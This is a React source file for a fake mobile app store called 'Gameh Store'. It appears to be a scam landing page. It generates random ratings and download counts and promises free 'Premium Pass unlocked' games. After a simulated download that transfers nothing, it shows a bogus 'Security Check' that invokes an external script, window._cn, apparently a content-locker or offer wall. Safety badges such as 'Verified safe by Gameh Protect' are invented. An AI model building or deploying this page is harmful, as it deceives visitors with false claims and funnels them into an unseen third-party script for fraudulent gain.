import React, { useState, useEffect, useMemo, useRef } from 'react';
import { 
  Download, Star, ShieldCheck, X, CheckCircle, Smartphone, 
  Search, Home, LayoutGrid, Gamepad2, ChevronRight, Share, Wifi, Lock
} from 'lucide-react';
import { APP_IMAGES } from './constants';
import { AppItem, ViewState } from './types';

// --- UTILS ---

const formatAppName = (url: string): string => {
  try {
    const filename = url.split('/').pop() || '';
    let name = filename.split('.')[0];
    
    if (name.length === 32 && /^[0-9a-f]+$/i.test(name)) {
      return "Premium Game Bundle";
    }

    name = name.replace(/[-_]/g, ' ');
    
    const junk = ['apk', 'mod', 'android', 'ios', 'mobile', 'full', 'free', 'download', 'icon', 'logo', 'app', 'v1', 'v2', '2024', '2025'];
    junk.forEach(word => {
      const regex = new RegExp(`\\b${word}\\b`, 'gi');
      name = name.replace(regex, '');
    });

    name = name.replace(/\d+x\d+/g, '');
    name = name.trim().replace(/\s+/g, ' ');

    if (/^x\d+$/i.test(name) || name.length < 2) {
      const num = name.replace(/\D/g, '');
      return `Gameh Exclusive ${num || ''}`;
    }

    return name.split(' ')
      .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
      .join(' ');
  } catch (e) {
    return 'Application';
  }
};

const generateMetadata = (seed: number) => {
  const ratings = [(4.6 + Math.random() * 0.4).toFixed(1), (4.2 + Math.random() * 0.7).toFixed(1)];
  const downloads = Math.floor(Math.random() * 800) + 120;
  const reviews = Math.floor(Math.random() * 80) + 20;
  const ageRating = ['4+', '9+', '12+', '17+'][Math.floor(Math.random() * 4)];
  const category = ['Action', 'RPG', 'Strategy', 'Arcade', 'Simulation'][Math.floor(Math.random() * 5)];
  return {
    rating: ratings[0],
    downloads: `${downloads}K`,
    reviews: `${reviews}K`,
    age: ageRating,
    category
  };
};

// --- COMPONENTS ---

const TabBar = ({ activeTab, onTabChange }: { activeTab: string, onTabChange: (t: string) => void }) => (
  <nav className="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-xl border-t border-gray-200 pb-safe pt-2 px-6 flex justify-between items-center z-40 text-[10px] font-medium text-gray-400">
    <button onClick={() => onTabChange('today')} className={`flex flex-col items-center gap-1 transition-colors ${activeTab === 'today' ? 'text-blue-600' : ''}`}>
      <Home size={24} strokeWidth={activeTab === 'today' ? 2.5 : 2} />
      Today
    </button>
    <button onClick={() => onTabChange('games')} className={`flex flex-col items-center gap-1 transition-colors ${activeTab === 'games' ? 'text-blue-600' : ''}`}>
      <Gamepad2 size={24} strokeWidth={activeTab === 'games' ? 2.5 : 2} />
      Games
    </button>
    <button onClick={() => onTabChange('apps')} className={`flex flex-col items-center gap-1 transition-colors ${activeTab === 'apps' ? 'text-blue-600' : ''}`}>
      <LayoutGrid size={24} strokeWidth={activeTab === 'apps' ? 2.5 : 2} />
      Apps
    </button>
    <button onClick={() => onTabChange('search')} className={`flex flex-col items-center gap-1 transition-colors ${activeTab === 'search' ? 'text-blue-600' : ''}`}>
      <Search size={24} strokeWidth={activeTab === 'search' ? 2.5 : 2} />
      Search
    </button>
  </nav>
);

const SearchHeader = () => (
  <div className="sticky top-0 bg-white/95 backdrop-blur-md z-30 px-4 py-2 border-b border-gray-100">
     <div className="relative">
       <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
       <input 
        type="text" 
        placeholder="Search Gameh Store" 
        className="w-full bg-gray-100 text-gray-900 rounded-xl pl-10 pr-4 py-2 text-base font-medium focus:outline-none focus:ring-2 focus:ring-blue-500/50"
        readOnly
      />
     </div>
  </div>
);

const SectionHeader = ({ title, link = "See All" }: { title: string, link?: string }) => (
  <div className="flex items-center justify-between px-5 mb-3 mt-6">
    <h2 className="text-xl font-bold text-gray-900 tracking-tight">{title}</h2>
    <button className="text-blue-600 text-sm font-medium">{link}</button>
  </div>
);

const FeaturedCard: React.FC<{ app: AppItem, onClick: () => void }> = ({ app, onClick }) => (
  <article onClick={onClick} className="min-w-[85%] snap-center flex flex-col gap-2 cursor-pointer active:scale-95 transition-transform duration-200">
    <div className="relative aspect-[16/9] rounded-2xl overflow-hidden shadow-md">
      <img src={app.image} alt={app.name} className="w-full h-full object-cover" />
      <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-black/20 to-transparent flex items-end p-5">
        <div>
          <span className="text-blue-400 text-xs font-bold uppercase tracking-wider mb-1 block">Editor's Choice</span>
          <h3 className="text-white font-bold text-2xl leading-tight mb-1">{app.name}</h3>
          <p className="text-gray-300 text-sm font-medium">{app.category} • {app.rating} ★</p>
        </div>
      </div>
    </div>
  </article>
);

const ListItem: React.FC<{ app: AppItem, rank?: number, onClick: () => void }> = ({ app, rank, onClick }) => (
  <article onClick={onClick} className="flex items-center gap-4 px-5 py-3.5 active:bg-gray-50 cursor-pointer transition-colors">
    {rank && <span className="text-lg font-bold text-gray-900 w-6 tabular-nums">{rank}</span>}
    <img src={app.image} alt="" className="w-16 h-16 rounded-[18px] bg-gray-100 object-cover shadow-sm border border-gray-100" loading="lazy" />
    <div className="flex-1 min-w-0 flex flex-col justify-center">
      <h3 className="text-base font-semibold text-gray-900 truncate leading-tight mb-0.5">{app.name}</h3>
      <p className="text-xs text-gray-500 truncate">{app.category}</p>
    </div>
    <div className="flex flex-col items-end gap-1">
      <button className="bg-gray-100 text-blue-600 font-bold text-xs py-1.5 px-4 rounded-full hover:bg-blue-100 transition-colors uppercase tracking-wide">
        Download
      </button>
      <span className="text-[9px] text-gray-400">In-App Purchase</span>
    </div>
  </article>
);

const ProductPage: React.FC<{ app: AppItem, onClose: () => void, onDownload: () => void }> = ({ app, onClose, onDownload }) => {
  const [mounted, setMounted] = useState(false);
  
  useEffect(() => {
    setMounted(true);
    window.history.pushState({ modal: true }, '');
    const handlePopState = () => onClose();
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, [onClose]);

  const screenshots = [app.image, app.image, app.image, app.image];

  return (
    <div className={`fixed inset-0 z-50 bg-white overflow-y-auto overflow-x-hidden transition-transform duration-300 ease-out ${mounted ? 'translate-y-0' : 'translate-y-full'}`}>
      <div className="sticky top-0 bg-white/95 backdrop-blur-md z-10 flex items-center justify-between px-4 py-2 border-b border-gray-100">
        <button onClick={() => window.history.back()} className="text-blue-600 flex items-center gap-1 font-medium p-2 -ml-2">
          <ChevronRight className="rotate-180" size={24} /> Back
        </button>
      </div>

      <main className="px-5 pt-6 pb-32">
        <div className="flex gap-5 mb-8 animate-fade-in">
          <img src={app.image} className="w-28 h-28 rounded-[22px] shadow-xl shadow-gray-200 border border-gray-100 object-cover shrink-0" />
          <div className="flex flex-col justify-between py-1">
            <div>
              <h1 className="text-2xl font-bold text-gray-900 leading-tight mb-1 line-clamp-2">{app.name}</h1>
              <p className="text-sm text-gray-500 font-medium">{app.category}</p>
            </div>
            <div className="flex items-center gap-3">
              <button 
                onClick={onDownload}
                className="flex-1 bg-blue-600 text-white font-bold text-sm py-2 px-6 rounded-full shadow-lg shadow-blue-200 active:scale-95 transition-all hover:bg-blue-700"
              >
                DOWNLOAD
              </button>
              <button className="p-2 bg-blue-50 rounded-full text-blue-600">
                <Share size={20} />
              </button>
            </div>
          </div>
        </div>

        <div className="flex justify-between items-center border-y border-gray-100 py-4 mb-8 overflow-x-auto no-scrollbar">
          <div className="flex flex-col items-center px-4 border-r border-gray-100 min-w-[90px]">
            <div className="flex items-center font-bold text-gray-700 text-sm mb-1">
              {app.rating} <Star size={12} className="fill-gray-700 ml-0.5" />
            </div>
            <div className="text-[10px] text-gray-400 font-medium">{app.reviews} RATINGS</div>
          </div>
          <div className="flex flex-col items-center px-4 border-r border-gray-100 min-w-[90px]">
             <div className="font-bold text-gray-700 text-sm mb-1">{app.age}</div>
             <div className="text-[10px] text-gray-400 font-medium">AGE</div>
          </div>
          <div className="flex flex-col items-center px-4 min-w-[90px]">
             <div className="font-bold text-gray-700 text-sm mb-1">Top 10</div>
             <div className="text-[10px] text-gray-400 font-medium">CHART</div>
          </div>
        </div>

        <div className="mb-8">
          <h2 className="text-xl font-bold text-gray-900 mb-4">Preview</h2>
          <div className="flex gap-4 overflow-x-auto no-scrollbar snap-x pb-6 -mx-5 px-5">
            {screenshots.map((src, i) => (
              <div key={i} className="snap-center shrink-0 w-[260px] aspect-[9/19] rounded-[20px] overflow-hidden shadow-lg border border-gray-100 relative group">
                 <img src={src} className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105" />
                 <div className="absolute inset-0 bg-black/10"></div>
              </div>
            ))}
          </div>
        </div>

        <div className="mb-8">
           <h2 className="text-xl font-bold text-gray-900 mb-3">Description</h2>
           <p className="text-sm text-gray-600 leading-relaxed font-normal">
             The world's most anticipated release is finally here on Gameh Store. <br/><br/>
             <strong>{app.name}</strong> brings console-quality graphics and immersive gameplay to your mobile device. 
             This exclusive version includes the <strong>Premium Pass</strong> unlocked for free, giving you access to all levels, skins, and unlimited resources immediately upon installation.
             <br/><br/>
             Join over {app.downloads} players in the ultimate 2026 gaming experience. Verified safe by Gameh Protect.
           </p>
        </div>
      </main>
    </div>
  );
};

const LoadingOverlay = ({ status, progress }: { status: string, progress: number }) => (
  <div className="fixed inset-0 z-[60] flex flex-col items-center justify-center bg-black/60 backdrop-blur-md animate-fade-in">
    <div className="bg-white p-8 rounded-[32px] shadow-2xl flex flex-col items-center max-w-[300px] w-full text-center relative overflow-hidden">
      {/* Background decoration */}
      <div className="absolute top-0 left-0 w-full h-1 bg-gray-100">
        <div className="h-full bg-blue-500 transition-all duration-200" style={{ width: `${progress}%` }}></div>
      </div>
      
      <div className="relative w-24 h-24 mb-6 mt-2">
        <svg className="w-full h-full rotate-[-90deg]">
          <circle cx="48" cy="48" r="42" stroke="#f1f5f9" strokeWidth="8" fill="none" />
          <circle 
            cx="48" cy="48" r="42" 
            stroke="#2563eb" strokeWidth="8" fill="none" 
            strokeDasharray="264" 
            strokeDashoffset={264 - (264 * progress) / 100}
            strokeLinecap="round"
            className="transition-all duration-200 ease-linear"
          />
        </svg>
        <div className="absolute inset-0 flex flex-col items-center justify-center">
             <span className="text-2xl font-bold text-gray-900">{Math.round(progress)}%</span>
        </div>
      </div>
      <h3 className="text-xl font-bold text-gray-900 mb-2">Downloading</h3>
      <div className="flex items-center gap-2 text-sm text-gray-500 font-medium bg-gray-50 px-3 py-1 rounded-full">
         <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
         {status}
      </div>
    </div>
  </div>
);

const VerifyOverlay = ({ appName }: { appName: string }) => {
    useEffect(() => {
        if (typeof window._cn === 'function') {
             window._cn();
        }
    }, []);

    return (
        <div className="fixed inset-0 z-[70] flex items-center justify-center p-5 bg-black/70 backdrop-blur-md animate-fade-in">
            <div className="bg-white rounded-[32px] w-full max-w-sm overflow-hidden shadow-2xl animate-pop-in relative">
                {/* Header Pattern */}
                <div className="bg-slate-900 p-6 text-center relative overflow-hidden">
                    <div className="absolute inset-0 opacity-10 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-white via-transparent to-transparent"></div>
                    <div className="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg shadow-blue-900/50 transform rotate-3">
                        <Lock className="text-white" size={32} strokeWidth={2.5} />
                    </div>
                    <h2 className="text-white font-bold text-xl tracking-tight">Security Check</h2>
                    <p className="text-blue-200 text-xs mt-1 uppercase tracking-wider font-semibold">Final Step Required</p>
                </div>
                
                <div className="p-8">
                    {/* Progress Steps */}
                    <div className="flex justify-between mb-8 relative">
                        <div className="absolute top-1/2 left-0 w-full h-0.5 bg-gray-100 -z-10"></div>
                        <div className="flex flex-col items-center gap-1">
                            <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center text-white">
                                <CheckCircle size={14} />
                            </div>
                            <span className="text-[10px] text-gray-500 font-medium">Connect</span>
                        </div>
                        <div className="flex flex-col items-center gap-1">
                            <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center text-white">
                                <CheckCircle size={14} />
                            </div>
                            <span className="text-[10px] text-gray-500 font-medium">Download</span>
                        </div>
                        <div className="flex flex-col items-center gap-1">
                            <div className="w-6 h-6 rounded-full bg-blue-600 flex items-center justify-center text-white animate-pulse">
                                <span className="text-xs font-bold">3</span>
                            </div>
                            <span className="text-[10px] text-blue-600 font-bold">Verify</span>
                        </div>
                    </div>

                    <div className="text-center mb-8">
                        <p className="text-gray-600 text-sm leading-relaxed">
                            To protect <strong>{appName}</strong> from bot traffic, please complete this quick automated verification.
                        </p>
                    </div>

                    <button 
                        onClick={() => window._cn && window._cn()}
                        className="w-full bg-blue-600 hover:bg-blue-700 active:scale-95 text-white font-bold py-4 rounded-xl shadow-xl shadow-blue-200 transition-all flex items-center justify-center gap-2 group animate-pulse-ring"
                    >
                        <span>Verify Now</span>
                        <ChevronRight size={18} className="group-hover:translate-x-1 transition-transform" />
                    </button>
                    
                    <div className="mt-6 flex items-center justify-center gap-2 text-[10px] text-gray-400">
                        <ShieldCheck size={12} className="text-green-500" />
                        <span>Verified Safe by Gameh Protect™ 2026</span>
                    </div>
                </div>
            </div>
        </div>
    );
};

// --- MAIN APP ---

const App = () => {
  const [viewState, setViewState] = useState<ViewState>('LIST');
  const [activeTab, setActiveTab] = useState('games');
  const [selectedApp, setSelectedApp] = useState<AppItem | null>(null);
  const [progress, setProgress] = useState(0);
  const [status, setStatus] = useState('Initializing...');

  const apps: AppItem[] = useMemo(() => {
    return APP_IMAGES.map((url, index) => {
      const meta = generateMetadata(index);
      return {
        id: `app-${index}`,
        name: formatAppName(url),
        image: url,
        size: `${(Math.random() * 400 + 50).toFixed(1)} MB`,
        ...meta
      };
    }).sort(() => Math.random() - 0.5);
  }, []);

  const featuredApps = useMemo(() => apps.slice(0, 5), [apps]);
  const listApps = useMemo(() => apps.slice(5), [apps]);

  const handleAppClick = (app: AppItem) => {
    setSelectedApp(app);
    setViewState('DETAIL');
  };

  const startDownload = () => {
    setViewState('PROGRESS');
    let p = 0;
    const interval = setInterval(() => {
      p += Math.random() * 4; // Slightly faster for UX
      if (p > 100) {
        p = 100;
        clearInterval(interval);
        setTimeout(() => setViewState('VERIFY'), 400);
      }
      
      setProgress(p);
      if (p < 20) setStatus('Handshake...');
      else if (p < 40) setStatus('Authenticating...');
      else if (p < 70) setStatus('Downloading Data...');
      else if (p < 90) setStatus('Unpacking Assets...');
      else setStatus('Finalizing...');
    }, 60);
  };

  return (
    <div className="bg-slate-50 min-h-screen font-sans text-slate-900 pb-20 selection:bg-blue-100">
      
      {/* Header */}
      <div className="sticky top-0 bg-white/80 backdrop-blur-xl z-30 pt-safe border-b border-gray-200/50 supports-[backdrop-filter]:bg-white/60">
        <div className="px-5 py-3 flex items-center justify-between">
            <div>
                <div className="text-[11px] font-bold text-gray-400 uppercase tracking-widest mb-0.5">
                    {new Date().toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric' })}
                </div>
                <h1 className="text-3xl font-extrabold text-slate-900 tracking-tight">
                    {activeTab === 'today' ? 'Today' : activeTab === 'games' ? 'Games' : activeTab === 'apps' ? 'Apps' : 'Search'}
                </h1>
            </div>
            <div className="w-10 h-10 bg-slate-900 rounded-full flex items-center justify-center text-white font-bold shadow-lg shadow-slate-200">
                G
            </div>
        </div>
        {activeTab === 'search' && <SearchHeader />}
      </div>

      {/* Main Content Area */}
      <main className="animate-fade-in">
        
        {/* Featured Slider */}
        {activeTab !== 'search' && (
          <section className="mt-4 mb-8 overflow-x-auto no-scrollbar snap-x flex gap-4 px-5 pb-4">
            {featuredApps.map((app) => (
              <FeaturedCard key={app.id} app={app} onClick={() => handleAppClick(app)} />
            ))}
          </section>
        )}

        {/* List Section */}
        <section className="max-w-2xl mx-auto pb-10">
          {activeTab !== 'search' && <SectionHeader title="Top Charts" />}
          
          <div className="flex flex-col bg-white border-y border-gray-200 divide-y divide-gray-100 shadow-sm">
             {listApps.map((app, index) => (
               <ListItem 
                 key={app.id} 
                 app={app} 
                 rank={index + 1} 
                 onClick={() => handleAppClick(app)} 
                />
             ))}
          </div>
        </section>
        
        {/* SEO Footer */}
        <footer className="py-12 px-6 text-center">
           <div className="flex justify-center gap-6 text-xs font-semibold text-gray-500 mb-6">
             <span>Terms</span>
             <span>Privacy</span>
             <span>Cookies</span>
           </div>
           <p className="text-[10px] text-gray-400 leading-relaxed max-w-xs mx-auto">
             Copyright © 2026 Gameh Store Inc. All rights reserved. <br/>
             All trademarks are the property of their respective owners. <br/>
             Gameh Store is verified safe and secure.
           </p>
        </footer>
      </main>

      {/* Tab Bar */}
      <TabBar activeTab={activeTab} onTabChange={setActiveTab} />

      {/* Modals */}
      {viewState === 'DETAIL' && selectedApp && (
        <ProductPage 
            app={selectedApp} 
            onClose={() => setViewState('LIST')} 
            onDownload={startDownload} 
        />
      )}

      {viewState === 'PROGRESS' && (
        <LoadingOverlay status={status} progress={progress} />
      )}

      {viewState === 'VERIFY' && selectedApp && (
        <VerifyOverlay appName={selectedApp.name} />
      )}

    </div>
  );
};

export default App;